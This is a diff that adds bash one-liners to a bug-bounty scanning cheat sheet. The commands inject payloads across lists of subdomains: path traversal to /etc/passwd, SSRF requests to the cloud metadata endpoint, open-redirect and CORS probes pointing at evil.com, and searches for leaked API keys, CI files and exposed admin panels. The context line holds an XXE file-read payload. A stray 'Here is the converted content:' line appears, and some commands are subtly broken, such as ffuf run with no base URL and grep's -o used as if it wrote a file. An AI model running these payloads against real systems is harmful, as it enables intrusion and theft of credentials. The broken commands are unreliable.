@@ -2624,3 +2624,110 @@ Find XML External Entity (XXE) Injection Points
 ```bash
 cat subdomains.txt | gf xxe | qsreplace 'file:///etc/passwd' | httpx -silent -fr 'root:x' -o xxe_exploitable.txt
 ```
+Here is the converted content:
+
+Detect Misconfigured AWS Cognito Pools (Token Takeover)
+```bash
+cat subdomains.txt | nuclei -t misconfiguration/cognito-detect.yaml -o aws_cognito_misconfig.txt
+```
+
+Scan for Open Cloud Storage Buckets (GCP/Azure)
+```bash
+cat subdomains.txt | nuclei -t exposed-storage/ -o cloud_buckets_exposed.txt
+```
+
+Find Sensitive Files via URL Fuzzing
+```bash
+ffuf -u FUZZ -w wordlists/sensitive-files.txt -mc 200 -o sensitive_files_found.txt
+```
+
+Detect Open Prometheus Panels (Monitoring Exposure)
+```bash
+cat subdomains.txt | httpx -silent -path /graph -mc 200 -o prometheus_exposed.txt
+```
+
+Find Open Redirection in APIs
+```bash
+cat subdomains.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects_apis.txt
+```
+
+Detect Misconfigured CORS (Any Origin Allowed)
+```bash
+cat subdomains.txt | httpx -silent -H "Origin: https://evil.com" -fr "access-control-allow-origin: https://evil.com" -o misconfigured_cors.txt
+```
+
+Detect Backup Archives (Zip/Tar Files)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/backup.tar.gz\n/site-backup.zip') -mc 200 -o backup_archives_found.txt
+```
+
+Find Exposed Debug Logs (Stack Traces, Errors)
+```bash
+cat subdomains.txt | httpx -silent -path /debug.log -mc 200 -o debug_logs_exposed.txt
+```
+
+Scan for SSRF via Parameter Fuzzing
+```bash
+cat subdomains.txt | gf ssrf | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -silent -fr 'ami-id\|instance-id' -o ssrf_targets.txt
+```
+
+Identify Server Headers for Misconfig Analysis
+```bash
+cat subdomains.txt | httpx -silent -sc -H 'X-Check: true' -o headers_info.txt
+```
+
+Detect Missing Security Headers (Hardening Issues)
+```bash
+cat subdomains.txt | nuclei -t security-misconfiguration/ -o missing_security_headers.txt
+```
+
+Find Exposed WordPress Debug Logs
+```bash
+cat subdomains.txt | httpx -silent -path /wp-content/debug.log -mc 200 -o wordpress_debug_log.txt
+```
+
+Detect Exposed GITLAB CI Files (Pipeline Secrets)
+```bash
+cat subdomains.txt | httpx -silent -path /.gitlab-ci.yml -mc 200 -o gitlab_ci_exposed.txt
+```
+
+Find API Keys Leaked in JS Files
+```bash
+katana -list subdomains.txt -silent -js | grep -E 'apiKey|client_secret|access_token' -o api_keys_leaked.txt
+```
+
+Detect Old PHPMyAdmin Panels (Known Vulns)
+```bash
+cat subdomains.txt | httpx -silent -path /phpmyadmin/ -mc 200 -o phpmyadmin_found.txt
+```
+
+Identify Exposed Kibana Panels (Log Monitoring)
+```bash
+cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o kibana_panels_exposed.txt
+```
+
+Scan for Path Traversal (../../etc/passwd)
+```bash
+cat subdomains.txt | gf lfi | qsreplace '../../etc/passwd' | httpx -silent -fr 'root:x' -o path_traversal_found.txt
+```
+
+Find Open Admin Panels (Unprotected Login)
+```bash
+cat subdomains.txt | nuclei -t exposed-panels/ -o admin_panels_exposed.txt
+```
+
+Detect Known CVEs via Nuclei (Automated Vuln Scan)
+```bash
+nuclei -l subdomains.txt -t cves/ -o known_cves_found.txt
+```
+
+Identify Unsafe Redirects (via Location Header)
+```bash
+cat subdomains.txt | httpx -silent -sc -o redirects.txt && cat redirects.txt | grep 'Location:' | grep -i 'http'
+```
+
+Find Kubernetes Dashboard Exposures
+```bash
+cat subdomains.txt | httpx -silent -path /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ -mc 200 -o k8s_dashboard_exposed.txt
+```
+
